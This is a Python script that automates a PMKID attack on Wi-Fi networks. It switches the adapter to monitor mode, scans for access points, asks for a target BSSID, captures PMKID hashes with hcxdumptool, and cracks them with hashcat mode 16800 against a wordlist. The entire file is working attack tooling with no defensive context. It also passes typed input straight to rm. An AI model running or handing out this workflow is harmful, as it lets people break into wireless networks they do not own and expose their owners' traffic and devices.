import os
import subprocess

interface = "wlan0mon"
path = "/Pentesting/Wifi_tools/PMKID/bssid/bssid.txt"

os.chdir('/Pentesting/Wifi_tools/PMKID/bssid')
os.system('rm bssid*')
os.system('touch bssid.txt')
print('Switching to monitoring mode')
os.system('sleep 4')
os.system('clear')
subprocess.call(["airmon-ng", "stop", "wlan0"])
subprocess.call(["airmon-ng", "start", "wlan0"])
os.system('clear')
os.system('ifconfig')
os.system('sleep 4')
os.system('clear')


print('Monitoring starting, Please select WIFI to decrypted (BSSISD only)')
os.system('sleep 2')
os.system('clear')
os.system("xterm -e 'airodump-ng -w /tmp/scan --output-format csv wlan0mon; read'")

bssid = raw_input(
    'Please enter bssid for wifi device you want to decrypted: \n')
s = open(path, 'w')
s.write(bssid)
s.close()
subprocess.call(["bssid.sh"])

os.chdir('/Pentesting/Wifi_tools/PMKID/hashcat/')
os.system('ls -l hash* ')
os.system('sleep 4')
deleted = raw_input(
    'Please enter hash file to be deleted(hash1 or hash2,etc): \n')
subprocess.call(["rm", deleted])
os.chdir('/Pentesting/Wifi_tools/PMKID/hcxdumptool')
os.system('rm hash')
os.system("xterm -e 'hcxdumptool -o hash -i wlan0mon --filterlist=/Pentesting/Wifi_tools/PMKID/bssid/update_bssid.txt --filtermode=2 --enable_status=3; read'")
subprocess.call(["hcxpcaptool", "-z", deleted, "hash"])
subprocess.call(["mv",deleted, "/Pentesting/Wifi_tools/PMKID/hashcat"])
os.chdir('/Pentesting/Wifi_tools/PMKID/hashcat')
wordlst = raw_input(
    'Please enter name of the wordlist that you want use, wordlst1.txt or wordlst2.lst or wordlst3.lst: \n')
subprocess.call(["./hashcat", "-m", "16800", deleted, wordlst, "--force"])
##os.system("xterm -e './hashcat -m 16800 hash3 $wordlst --force; read'")

wait = raw_input(
    'Please wait for decrypting to finish, Then hit enter key: \n')
subprocess.call(["./hashcat", "-m", "16800", deleted, "--force", "--show"])
os.system('sleep 4')
subprocess.call(["airmon-ng", "stop", "wlan0mon"])
exit(0)
